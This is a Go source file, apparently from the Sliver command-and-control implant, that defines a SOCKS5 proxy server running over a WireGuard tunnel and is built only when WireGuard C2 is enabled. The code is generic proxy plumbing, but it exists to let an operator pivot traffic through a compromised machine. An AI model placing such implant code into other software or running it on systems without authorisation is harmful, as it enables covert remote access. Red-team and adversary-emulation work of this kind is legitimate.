package forwarder

// {{if .Config.WGc2Enabled}}
import (
	"fmt"
	"net"

	"github.com/bishopfox/sliver/implant/sliver/netstack"
	"github.com/lesnuages/go-socks5"
)

var socksServerID = 0

// WGSocksServer implements a Socks5 server
type WGSocksServer struct {
	ID       int
	lport    int
	tunIP    string
	tnet     *netstack.Net
	done     chan bool
	listener net.Listener
}

func NewWGSocksServer(lport int, tunIP string, tnet *netstack.Net) *WGSocksServer {
	ss := &WGSocksServer{
		lport: lport,
		tunIP: tunIP,
		tnet:  tnet,
		done:  make(chan bool),
		ID:    socksServerID,
	}
	nextSocksServerID()
	socksServers[ss.ID] = ss
	return ss
}

func (s *WGSocksServer) LocalAddr() string {
	return fmt.Sprintf("%s:%d", s.tunIP, s.lport)
}

func (s *WGSocksServer) Start() error {
	config := &socks5.Config{}
	server, err := socks5.New(config)
	if err != nil {
		return err
	}
	select {
	case <-s.done:
		return nil
	default:
		s.listener, err = s.tnet.ListenTCP(&net.TCPAddr{
			IP:   net.ParseIP(s.tunIP),
			Port: s.lport,
		})
		if err != nil {
			return err
		}
		if s.listener == nil {
			return fmt.Errorf("socks listener is nil")
		}
		return server.Serve(s.listener)
	}
}

func (s *WGSocksServer) Stop() {
	close(s.done)
	s.listener.Close()
}

func nextSocksServerID() {
	socksServerID++
}

// {{end}}
